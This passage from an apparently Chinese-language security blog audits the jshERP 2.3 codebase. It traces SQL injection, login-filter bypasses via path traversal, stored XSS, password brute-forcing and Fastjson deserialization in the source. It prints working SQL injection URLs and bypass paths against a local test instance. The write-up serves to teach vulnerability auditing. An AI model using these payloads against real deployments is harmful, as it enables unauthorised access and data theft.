#56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getUnitList</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Map</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> String</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> map)throws Exception {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> search </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Constants</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">SEARCH</span><span style="color: #ABB2BF">);</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// Constants.SEARCH 就是search</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInfo</span><span style="color: #ABB2BF">(search, </span><span style="color: #98C379">&quot;name&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic">// 通过StringUtil.getInfo 获取name值</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> order </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">QueryUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">order</span><span style="color: #ABB2BF">(map);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">unitService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">select</span><span style="color: #ABB2BF">(name, </span><span style="color: #E5C07B">QueryUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">offset</span><span style="color: #ABB2BF">(map), </span><span style="color: #E5C07B">QueryUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">rows</span><span style="color: #ABB2BF">(map));</span><span style="color: #E06C75">  </span><span style="color: #7F848E; font-style: italic">// QueryUtils.offset(map) 需要我们传入的其他参数有具体的值，且是数字</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>此处查看name值获取过程，到<code>getInfo</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getInfo</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> search</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> key){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(search</span><span style="color: #56B6C2">!=</span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">JSONObject</span><span style="color: #E06C75"> obj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JSONObject</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parseObject</span><span style="color: #ABB2BF">(search);</span><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// 解析成json对象（json反序列化）</span></span><span class="line"><span style="color: #E06C75">        value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(key);</span><span style="color: #E06C75">     </span><span style="color: #7F848E; font-style: italic">// 然后从解析的json对象中拿出来name 的属性值</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">value</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> value</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>就是说，我们传入的search 参数内容应该是一个json 内容</p></li><li><p>到<code>getUnitList</code></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">@Override</span></span><span class="line"><span style="color: #abb2bf">    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception {</span></span><span class="line"><span style="color: #abb2bf">        return getUnitList(map);</span></span><span class="line"><span style="color: #abb2bf">    }</span></span></code></pre></div></div></figure></li><li><p>再到<code>select</code></p><p>到这里，变成了两个参数控制</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">select</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> apiName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> String</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> parameterMap)throws Exception {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isNotEmpty</span><span style="color: #ABB2BF">(apiName)</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">container</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getCommonQuery</span><span style="color: #ABB2BF">(apiName).</span><span style="color: #61AFEF">select</span><span style="color: #ABB2BF">(parameterMap);</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ArrayList</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ul></li><li><p>这个select 在往上找，就来到了最后的controller 层</p><p>jshERP-2.3\src\main\java\com\jsh\erp\controller\ResourceController.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165030075.png" alt="image-20250823235517735"></p></li><li><p>查找apiName是什么？？</p><p>寻找apiName从哪里传入，输入get(apiName)查找</p><p>jshERP-2.3\src\main\java\com\jsh\erp\service\CommonQueryManager.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165031978.png" alt="image-20250824000024856"></p><p>说明：<code>apiName</code>的值会从<code>configComponentMap</code>这个变量中获取，而这个变量在<code>init</code> 函数中被put 压入数据。</p><p>具体的内容是：service下每个文件夹对应一个apiName</p><p>而我们一开始回溯搜索的<code>selectByConditionUnit</code>实现方法就是在<code>service\unit\UnitService.java</code>，所以这里我们需要的apiName 的值就是unit</p><p>而且需要传入参数有三个：<code>pageSize</code>、<code>currentPage</code>、<code>search</code></p></li><li><p>整理:</p><p>两个点：</p><ul><li><p>第一个传入json：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">payload：</span></span><span class="line"><span style="color: #abb2bf">http://127.0.0.1:8080/unit/list?search=/unit/list?search=%7B%22name%22%3A%22jsh%27%20or%201%3D1--%2B%22%7D&amp;pageSize=10&amp;currentPage=1&amp;pageSize=10&amp;currentPage=1</span></span></code></pre></div></div></figure></li><li><p>第二个点利用apiname——&gt;unit：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">payload：</span></span><span class="line"><span style="color: #abb2bf">http://127.0.0.1:8080/unit/list?pageSize=&amp;currentPage=&amp;search=jsh&#39; and sleep(3)--+</span></span></code></pre></div></div></figure></li></ul></li><li><p>应该是先走第一个</p><p>所以payload是传入json的内个</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165034376.png" alt="image-20250824002710881"></p><h2 id="权限校验"><a href="#权限校验" class="headerlink" title="权限校验"></a>权限校验</h2><h3 id="包含特定路径可绕过过滤器"><a href="#包含特定路径可绕过过滤器" class="headerlink" title="包含特定路径可绕过过滤器"></a>包含特定路径可绕过过滤器</h3><ol><li><p>当URL中包含<code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>则放行数据包</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75"> (requestUrl </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/doc.html&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">||</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/register.html&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">contains</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/login.html&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">)) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure></li><li><p>构建路径<code>/doc.html/..</code> 再加上正常访问的路径，<code>/doc.html/..</code> 会返回根路径，再加上正常访问路径即可正常访问各功能点</p></li><li><p>正常登录返回两个数据包（先返回一个post，提交之后会返回一个get）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165036442.png" alt="image-20250824003549637"></p></li><li><p>删除登录后的Cookie中的session信息的数据包，返回302重定向代码，返回login.html</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165038106.png" alt="image-20250824003612455"></p></li><li><p>加入越权Payload后的数据包，获取信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165039947.png" alt="image-20250824003654566"></p></li></ol><h3 id="verify-验证可绕过过滤器"><a href="#verify-验证可绕过过滤器" class="headerlink" title="verify()验证可绕过过滤器"></a>verify()验证可绕过过滤器</h3><ol><li><p>一开始定义了要忽略的文件名后缀，包括：<code>.css</code>、<code>.js</code>、<code>.jpg</code>、<code>.png</code>、<code>.gif</code>、<code>.ico</code>文件，之后传递到初始化方法中，生成<code>ignoredList</code>列表</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebFilter</span><span style="color: #E06C75">(</span><span style="color: #D19A66">filterName</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;LogCostFilter&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">urlPatterns</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #98C379">&quot;/*&quot;</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #D19A66">initParams</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebInitParam</span><span style="color: #E06C75">(</span><span style="color: #D19A66">name</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ignoredUrl&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;.css#.js#.jpg#.png#.gif#.ico&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                      </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebInitParam</span><span style="color: #E06C75">(</span><span style="color: #D19A66">name</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;filterPath&quot;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                              </span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/user/login#/user/registerUser#/v2/api-docs&quot;</span><span style="color: #E06C75">)})</span></span></code></pre></div></div></figure></li><li><p>使用<code>verify()</code>方法进行验证，根据代码判断，当访问的文件后缀在<code>ignoredList</code>中，就放行数据包</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165041609.png" alt="image-20250823224849701"></p></li><li><p>构建poc</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">/a.css/..`，后面再加上正常访问的路径即可</span></span></code></pre></div></div></figure></li><li><p>同上直接构建payload越权获取用户信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165043428.png" alt="image-20250824003817616"></p></li></ol><h3 id="使用特定路径前缀可绕过过滤器"><a href="#使用特定路径前缀可绕过过滤器" class="headerlink" title="使用特定路径前缀可绕过过滤器"></a>使用特定路径前缀可绕过过滤器</h3><ol><li><p>一开始定义了些允许访问的路径前缀：<code>/user/login</code>、<code>/user/registerUser</code>、<code>/v2/api-docs</code>，初始化方法中把运行访问路径生成<code>alowUrls</code>列表</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebFilter</span><span style="color: #E06C75">(</span><span style="color: #D19A66">filterName</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;LogCostFilter&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">urlPatterns</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #98C379">&quot;/*&quot;</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #D19A66">initParams</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> {</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebInitParam</span><span style="color: #E06C75">(</span><span style="color: #D19A66">name</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;ignoredUrl&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;.css#.js#.jpg#.png#.gif#.ico&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                      </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebInitParam</span><span style="color: #E06C75">(</span><span style="color: #D19A66">name</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;filterPath&quot;</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                              </span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/user/login#/user/registerUser#/v2/api-docs&quot;</span><span style="color: #E06C75">)})</span></span></code></pre></div></div></figure></li><li><p>对URL进行判断，若使用的路径开头在<code>allowUrls</code>列表中，则放行数据包</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> allowUrls </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">allowUrls</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> url </span><span style="color: #C678DD">:</span><span style="color: #E06C75"> allowUrls) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">requestUrl</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">startsWith</span><span style="color: #ABB2BF">(url)</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span style="color: #E06C75">                    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">                }</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">servletResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">sendRedirect</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/login.html&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>判断方法中使用startsWith()方法进行验证，可以使用目录穿越的方式进行绕过，构建Payload路径：<code>/user/login/../..</code> ，后面再添加正常访问路径即可</p></li><li><p>同上直接在数据包搞payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165045737.png" alt="image-20250824003846664"></p></li></ol><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ol><li><p>在前端html 目录中搜索有关<code>/add</code> 增加的功能页</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165049113.png" alt="image-20250825001033863"></p></li><li><p>有一个增加用户的功能点，先增加一个用户</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165051098.png" alt="image-20250825001210544"></p></li><li><p>然后修改用户名</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165052176.png" alt="image-20250825001418935"></p></li><li><p>成功弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165054113.png" alt="image-20250825001355332"></p></li><li><p>但有一个前提是拥有登陆后台的高权限</p></li></ol><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><ol><li><p>查看user相关代码，发现登录功能没有对登录次数进行限制，也没有验证码验证</p><p>\jshERP-2.3\src\main\java\com\jsh\erp\datasource\entities\User.java</p></li><li><p>这是用户登录的代码jshERP-2.3\src\main\java\com\jsh\erp\controller\UserController.java</p><p>可以进行暴力用户名、密码测试</p></li><li><p>查看登录数据包</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">POST /user/login HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: 192.168.137.242:8080</span></span><span class="line"><span style="color: #abb2bf">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0</span></span><span class="line"><span style="color: #abb2bf">Accept: application/json, text/javascript, */*; q=0.01</span></span><span class="line"><span style="color: #abb2bf">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="line"><span style="color: #abb2bf">Accept-Encoding: gzip, deflate, br</span></span><span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span></span><span class="line"><span style="color: #abb2bf">X-Requested-With: XMLHttpRequest</span></span><span class="line"><span style="color: #abb2bf">Content-Length: 55</span></span><span class="line"><span style="color: #abb2bf">Origin: http://192.168.137.242:8080</span></span><span class="line"><span style="color: #abb2bf">Connection: keep-alive</span></span><span class="line"><span style="color: #abb2bf">Referer: http://192.168.137.242:8080/login.html</span></span><span class="line"><span style="color: #abb2bf">Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755958707,1755966272,1755966567,1756050714; JSESSIONID=3BC51C24F7937AAE005C1EEF190EBC9E; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1756053268; HMACCOUNT=BDACAAE04DCF04BE</span></span><span class="line"><span style="color: #abb2bf">Priority: u=0</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">loginName=jsh&amp;password=e10adc3949ba59abbe56e057f20f883e//这是账号密码</span></span></code></pre></div></div></figure></li><li><p>可以看到密码加密了（根据密码加密格式可以猜测为md5）（也可以去跑ai）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165150570.png" alt="image-20250825003652031"></p></li><li><p>而且在userservice也发现MD5加密的注释</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165059147.png" alt="image-20250825003754355"></p></li><li><p>所以可以使用bp的插件，根据字典进行爆破（<strong>记得勾选MD5的加密哈</strong>）</p><p>这里我就偷个小懒，不具体演示了哈</p></li></ol><h2 id="Fastjson反序列化漏洞"><a href="#Fastjson反序列化漏洞" class="headerlink" title="Fastjson反序列化漏洞"></a>Fastjson反序列化漏洞</h2><ol><li><p>扫描<code>pom.xml</code>文件时发现存在1.2.55 版本Fastjson的，上面说过，这个版本是存在反序列化漏洞的版本</p></li><li><p>直接搜索<code>parseObject(</code>关键字 ; 或者换一种思路，直接寻找上面 SQL 注入的一样的<code>search</code></p><p><strong>注意：</strong>这里反序列化的地方很多，我们要去找的地方一定是要输入可控的。</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165101586.png" alt="image-20250825004159390"></p></li><li><p>定位到<code>StringUtil</code>类文件，其中的静态方法<code>getInfo</code>调用了<code>JSONObject.parseObject()</code>方法，传递的参数是<code>search</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getInfo</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> search</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> key){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(search</span><span style="color: #56B6C2">!=</span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">JSONObject</span><span style="color: #E06C75"> obj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JSONObject</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parseObject</span><span style="color: #ABB2BF">(search);</span></span><span class="line"><span style="color: #E06C75">            value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getString</span><span style="color: #ABB2BF">(key);</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">value</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> value</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>查看<code>getInfo</code>方法的使用情况，发现之前查看过的<code>PersonComponent</code>类(巧了，就是之前审计的sql的代码)</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165103672.png" alt="image-20250825004946970"></p></li><li><p>查看<code>PersonComponent</code>类文件，<code>getPersonList()</code>方法调用了<code>StringUtil.getInfo()</code>方法，参数也是search中获取</p><figure class="shiki java"><div 